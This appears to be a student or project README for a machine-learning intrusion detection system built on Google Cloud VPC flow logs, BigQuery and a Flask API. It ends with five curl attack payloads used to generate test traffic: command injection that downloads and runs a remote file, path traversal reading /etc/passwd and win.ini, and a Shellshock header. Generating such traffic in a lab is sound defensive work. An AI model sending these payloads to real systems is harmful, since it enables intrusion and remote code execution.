# ML-based-real-time-intrusion-detection-system for cloud computing environments
Creating a ML based real-time intrusion detection system using Google Clouds Compute Engine


 System Model
The proposed system model consists of two VM setup using Google Cloud Platform Compute Engine, the VMs are for the server and the attacker. The Virtual Private Cloud (VPC) network for the VM is configured to enable flow logs (allowing HTTP traffic) of the VM, the VPC plays the role of a packet sniffer used to inspect the network traffic logs passing via the VM of both the server and client. In the VPC network setup, a subnet is configured of the range 192.168.10.0/24, the subnet aims at making networks more efficient. The Firewall rules are also set-up to allow ingress traffic from the IP range 35.235.240.0/20 that will use TCP forwarding. Finally, an endpoint is created.

The extracted data will be organized in a table format using BigQuery into a feature array and sent as an HTTP request over the internet to the API endpoint of the API backend using google-chrome-bigquery library and SSH. The HTTP request's data is extracted by the API backend controller and fed into the Flask API. The protocol used is TCP port 80,22 and ICMP protocol to the server. 
A sink is created to capture and store the mirrored packets from the VM web server, which are transformed into a BigQuery dataset. In the BigQuery database a custom SQL command is executed querying the following fields timestamp, source_ip, destination_ip, bytes_sent, src_port, dest_port, protocol, packets_sent which will be used for the IDS

The Flask app runs all its file on a Virtual Environment to allow python packages to be installed in an isolated location for the app.py application. Ensuring the dependency of the project does not interfere with other projects. Venv is used to create manage virtual environments.

1.9.3.	BigQuery SQL Command
The v table stores all the relevant features that will be used for the intrusion detection.
CREATE TABLE `gothic-style-406819.bq_vpcflows.v` AS
SELECT
timestamp,
jsonPayload.connection.src_ip,
jsonPayload.connection.dest_ip,
SUM(CAST(jsonPayload.bytes_sent AS INT64)) AS bytes,
jsonPayload.connection.src_port,
jsonPayload.connection.dest_port,
jsonPayload.connection.protocol,
jsonPayload.packets_sent
FROM
`gothic-style-406819.bq_vpcflows.compute_googleapis_com_vpc_flows_20231202`
WHERE jsonPayload.reporter = 'DEST'
GROUP BY
timestamp,
jsonPayload.connection.src_ip,
jsonPayload.connection.dest_ip,
jsonPayload.connection.src_port,
jsonPayload.connection.dest_port,
jsonPayload.connection.protocol,
jsonPayload.packets_sent
ORDER BY
bytes DESC
LIMIT 70



Simulating an attack
Consists of a set-up of two VM one for the server and one for the attacker. The VM of the web server is the one attacks are being launched at by the VM of the attacker which the attack traffic source. Is an attack output of the simulated attack in an html file. 
Attack Simulation using Powershell
Attack 1
curl "http://192.168.10.20/weblogin.cgi?username=admin';cd /tmp;wget http://123.123.123.123/evil;sh evil;rm evil"

Attack 2
curl http://192.168.10.20/?item=../../../../WINNT/win.ini

Attack 3
curl http://192.168.10.20/eicar.file

Attack4
curl http://192.168.10.20/cgi-bin/../../../..//bin/cat%20/etc/passwd

Attack5
curl -H 'User-Agent: () { :; }; 123.123.123.123:9999' http://192.168.10.20/cgi-bin/test-critical

